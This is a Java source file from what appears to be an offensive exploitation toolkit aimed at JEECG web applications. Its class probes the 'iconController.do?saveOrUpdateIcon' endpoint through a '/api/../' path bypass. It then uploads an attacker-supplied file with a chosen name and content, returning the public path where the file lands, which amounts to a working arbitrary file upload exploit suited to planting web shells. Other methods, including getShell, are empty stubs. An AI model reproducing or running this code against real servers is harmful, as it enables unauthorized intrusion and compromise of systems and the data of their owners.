package com.example.jeecg_tools.exploit;

 import cn.hutool.http.HttpResponse;
 import cn.hutool.http.HttpRequest;
 import cn.hutool.http.Method;
 import com.example.jeecg_tools.common.BasePayload;
 import com.example.jeecg_tools.entity.Result;
 import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;


public class JEECG_iconUpload implements BasePayload {


    @Override
    public Result checkVUL(String str) throws Exception {
        String payload = str+"/api/../iconController.do?saveOrUpdateIcon";
        try {
            HttpResponse req = HttpRequest.get(payload).execute();
            String reqbody = req.body();
            if (req.getStatus()==200){
                return new Result(true,payload, reqbody);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return new Result(false,payload,null);
    }

    @Override
    public Result exeVUL(String str, String str2) throws Exception {
        return null;
    }

    @Override
    public Result getShell(String str) throws Exception {
        return null;
    }

    @Override
    public Result fileUpload(String str, String filename,String filecontent) throws Exception {
        String payload = str+"/api/../iconController.do?saveOrUpdateIcon";
        byte[] fileContentByte = filecontent.getBytes(StandardCharsets.UTF_8);
        Map<String,Object> map = new HashMap<>();
        map.put("iconType","");
        map.put("iconName","");
        try{

            HttpRequest httpRequest = new HttpRequest(payload);
            httpRequest.setMethod(Method.POST);
            httpRequest.form(map);
            httpRequest.form("file",fileContentByte,filename);
            HttpResponse rep = httpRequest.execute();

            int startcode  = rep.getStatus();
            String reqbody = rep.body();

        if (startcode==200 && reqbody.contains("true")){
            return new Result(true,null, "/plug-in/accordion/images/"+filename);
        }
    }catch (Exception e){
        e.printStackTrace();
    }
        return new Result(false,null,null);
    }

    @Override
    public Result Inject(String url, String xsfilename, String payload) throws Exception {

        return null;
    }


}
